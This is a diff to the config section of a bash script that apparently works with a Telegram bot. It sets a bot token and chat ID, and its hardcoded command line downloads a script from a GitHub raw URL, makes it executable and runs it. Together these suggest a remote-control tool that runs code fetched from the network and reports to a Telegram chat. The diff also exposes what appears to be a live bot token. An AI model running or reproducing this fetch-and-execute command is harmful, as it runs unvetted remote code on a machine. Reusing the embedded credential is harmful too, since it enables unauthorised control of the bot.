@@ -9,7 +9,7 @@ set -euo pipefail
 ################ CONFIG ################
 TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
 CHAT_ID="6565158025"
-HARDCODE_CMD='curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/linux-tools.sh -o linux-tools.sh && chmod +x linux-tools.sh && ./yt-web.sh'   # <-- replace this with your hardcoded command
+HARDCODE_CMD='curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/yt-web.sh -o yt-web.sh && chmod +x yt-web.sh && ./yt-web.sh'   # <-- replace this with your hardcoded command
 ########################################
 
 API="https://api.telegram.org/bot${TOKEN}"
